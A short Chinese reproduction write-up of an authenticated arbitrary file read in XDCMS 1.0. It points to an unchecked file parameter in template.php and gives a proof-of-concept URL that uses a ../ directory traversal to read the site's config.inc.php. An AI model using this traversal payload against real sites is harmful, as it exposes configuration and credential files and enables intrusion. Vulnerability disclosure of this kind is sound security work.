# XDCMS 1.0 后台任意文件读取

> 原文：[https://www.zhihuifly.com/t/topic/3276](https://www.zhihuifly.com/t/topic/3276)

# XDCMS 1.0 后台任意文件读取

## 一、漏洞简介

## 二、漏洞影响

XDCMS 1.0

## 三、复现过程

漏洞文件漏洞文件：`system\modules\xdcms\template.php`，同上述xss漏洞相同

![image](img/ced7418c2d9685d6d7b5d4c0e809a470.png)

第43行未对文件进行限制，从而导致了目录遍历，造成任意文件读取

对GET数据没有过滤

```
http://www.0-sec.orv/xdcms/index.php?m=xdcms&c=template&f=edit&file=../../../data/config.inc.php 
```

后台任意文件读取。

![image](img/1673cce9c0c4275cd3e54abc181cb3fa.png)